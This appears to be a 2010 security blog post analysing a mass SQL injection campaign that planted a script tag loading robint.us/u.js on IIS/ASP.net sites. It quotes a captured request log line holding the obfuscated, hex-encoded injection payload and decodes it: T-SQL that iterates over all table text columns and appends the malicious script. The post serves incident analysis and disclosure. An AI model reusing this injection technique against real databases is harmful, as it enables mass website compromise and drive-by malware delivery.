Mass infection of IIS/ASP sites – robint.us

An incredibly large number of sites have been hacked in the last day with a malware script pointing to https://ww.robint.us/u.js. Not only small sites, but some big ones got hit as well:
https://www.intljobs.org (still hacked)
https://www.servicewomen.org (still hacked)
https://online.wsj.com (partially fixed)
https://www.asbmb.org
https://www.lotl.com
https://acsi.org/
https://www.cinemathequeontario.ca

How many sites got infected? According to Google over *114.000 different pages have been infected. Wow!

Update 09/06/10 – not 1,000,000+ like we originally reported, sorry – bad google-fu.

What do all these sites have in common? They are all hosted on IIS servers and using ASP.net. This is the output of our scanner against www.intljobs.org:

This is the same attack reported by Sophos yesterday that hacked the Jerusalem Post.
Update 09/06/10 – Dale Neufeld from NSM Junkie was able to collect logs and packet dump from the attack. This is what he found:
Original web request (payload truncated for readability):

2010-06-07 13:31:15 W3SVC1 webserver 192.168.1.10 GET /page.aspx utm_source=campaign&utm_medium=banner&utm_campaign=campaignid&utm_content=100×200′;dEcLaRe%20@s%20vArChAr(8000)%20sEt%20@s=0x6445634C6152652040742076……..
6F523B2D2D%20eXEc(@s)– 80 – 121.xx.xxx.xx HTTP/1.1 Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+5.1;+.NET+CLR+1.1.4322) – – www.website.com 200 0 0 32068 1685 0

When we pull this apart we have:

dEcLaRe @s vArChAr(8000)
set @s=0x6445634C6152652040742076……..6F523B2D2D
eXEc(@s)–

So they’re essentially setting up the varaible ‘@s’ and executing it. Next we decode the variable ‘@s’:

0xdEcLaRe @t vArChAr(255),@c vArChAr(255) dEcLaRe tAbLe_cursoR cUrSoR FoR sElEcT a.nAmE,b.nAmE FrOm sYsObJeCtS a,sYsCoLuMnS b wHeRe a.iD=b.iD AnD a.xTyPe=’u’ AnD (b.xTyPe=99 oR b.xTyPe=35 oR b.xTyPe=231 oR b.xTyPe=167) oPeN tAbLe_cursoR fEtCh next FrOm tAbLe_cursoR iNtO @t,@c while(@@fEtCh_status=0) bEgIn exec(‘UpDaTe [‘+@t+’] sEt [‘+@c+’]=rtrim(convert(varchar(8000),[‘+@c+’]))+cAsT(0x3C736372697074207372633D687474703A2F2F77772E726F62696

Now they’re iterating through the sysobjects table to find out your actual table names and then iterating through those and appending the final encoded string.

cAsT(0x3C736372697074207372633D687474703A2F2F77772E726F62696E742E75732
F752E6A733E3C2F7363726970743E

Decoded:

0x<script src=hxxp://ww.robint.us/u.js></script>
